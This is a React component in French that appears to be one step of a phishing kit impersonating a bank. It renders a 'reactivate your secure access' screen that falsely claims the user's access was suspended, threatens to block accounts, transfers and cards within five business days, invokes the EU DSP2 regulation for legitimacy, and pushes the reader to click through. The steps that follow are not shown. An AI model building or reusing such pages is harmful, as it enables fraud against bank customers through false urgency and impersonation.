export default function BpStepAlert({ onContinue }: { onContinue: () => void }) {
  return (
    <section className="pt-28 min-h-screen flex items-center justify-center px-4 py-8">
      <div className="w-full max-w-md animate-fadeIn">
        <div className="bg-white rounded-2xl shadow-lg p-8 text-center">
          <div className="flex justify-center mb-6">
            <div className="w-16 h-16 rounded-full border-4 border-primary flex items-center justify-center">
              <svg className="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
          </div>
          <h1 className="text-2xl font-bold text-gray-900 mb-6 leading-tight uppercase tracking-tight">
            Réactivation de<br />votre<br />accès sécurisé
          </h1>
          <p className="text-sm text-gray-700 leading-relaxed mb-4">
            Dans le cadre du renforcement de nos protocoles de sécurité bancaire, une vérification obligatoire de l'ensemble des services d'accès est en cours. Votre accès sécurisé a été
            <strong className="font-bold"> temporairement suspendu</strong> le temps de cette procédure.
          </p>
          <p className="text-sm text-gray-700 leading-relaxed mb-4">
            <strong className="font-bold">Sans réactivation sous 5 jours ouvrés, l'accès à vos comptes, virements et paiements en ligne sera automatiquement bloqué.</strong> Vos moyens de paiement (carte bancaire, prélèvements) pourraient également être impactés.
          </p>
          <p className="text-sm text-gray-700 leading-relaxed mb-6">
            Cette procédure est <strong className="font-bold">entièrement gratuite</strong> et ne prend que quelques minutes.
          </p>
          <button onClick={onContinue} className="w-full py-4 bg-primary hover:bg-primary-dark text-white font-bold text-sm uppercase tracking-wide rounded-full transition-all shadow-md hover:shadow-lg cursor-pointer">
            Réactiver mon accès
          </button>
          <p className="text-xs text-gray-500 mt-4 leading-relaxed">
            En cliquant, vous acceptez de vous soumettre à la procédure de vérification d'identité renforcée requise par la réglementation européenne DSP2.
          </p>
        </div>
      </div>
    </section>
  );
}
